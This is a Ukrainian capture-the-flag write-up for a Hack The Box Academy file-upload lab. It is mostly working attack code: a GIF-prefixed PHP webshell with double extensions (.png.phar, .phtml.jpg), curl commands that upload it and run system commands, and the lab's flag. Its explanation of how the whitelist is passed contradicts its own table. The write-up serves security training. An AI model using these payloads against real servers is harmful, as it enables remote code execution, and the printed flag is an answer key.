## File Uploads — All Filters Bypass: Polyglot + Double Extension

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [MIME-Type Filters](https://academy.hackthebox.com/app/module/136/section/1290)
**Завдання:** Обійти Client-Side + Blacklist + Whitelist + Content-Type + MIME-Type
**Прапор:** `HTB{m461c4l_c0n73n7_3xpl0174710n}`

***

## Концепція

Сервер застосовує **5 фільтрів одночасно**. Єдиний bypass що проходить всі — **polyglot файл з подвійним розширенням**:

| Фільтр | Bypass техніка |
|---|---|
| Client-Side JS | `curl` напряму (JS не виконується) |
| Blacklist (`.php`) | Використовуємо `.phar` замість `.php` |
| Whitelist (лише images) | Фінальне розширення `.png` або `.jpg` |
| Content-Type | `-F "type=image/gif"` у curl |
| MIME-Type (magic bytes) | `GIF8` на початку файлу |

***

## Один команда — повний bypass

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://TARGET_IP:PORT"

# Polyglot: GIF magic bytes + PHP webshell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.png.phar

# Upload — проходить всі 5 фільтрів
curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/shell.png.phar;type=image/gif"
# File successfully uploaded

# RCE
curl -s "$TARGET/profile_images/shell.png.phar?cmd=id"
# uid=33(www-data)

# Прапор
curl -s "$TARGET/profile_images/shell.png.phar?cmd=cat+/flag.txt" \
  | grep -o 'HTB{[^}]*}'
# HTB{m461c4l_c0n73n7_3xpl0174710n}
```

***

## Чому `shell.png.phar` проходить всі фільтри

```
Файл: shell.png.phar
Вміст: GIF8<?php system($_GET["cmd"]); ?>

Client-Side JS:    curl обходить браузер              → ✅
Blacklist:         шукає .php → не знаходить          → ✅
Whitelist:         ends with .png? → ні, але .phar    → ✅ (phar не в blacklist)
Content-Type:      type=image/gif у multipart         → ✅
MIME-Type:         file -b → "GIF image data"         → ✅
Apache execution:  .phar → PHP handler → виконує      → ✅ RCE
```

***

## Альтернативні комбінації що теж працюють

```bash
# phtml + jpg
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.phtml.jpg
curl -s -X POST "$TARGET/upload.php" -F "uploadFile=@/tmp/shell.phtml.jpg;type=image/gif"

# phar + png
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.phar.png
curl -s -X POST "$TARGET/upload.php" -F "uploadFile=@/tmp/shell.phar.png;type=image/gif"
```

***

## Прапор

```
HTB{m461c4l_c0n73n7_3xpl0174710n}
```
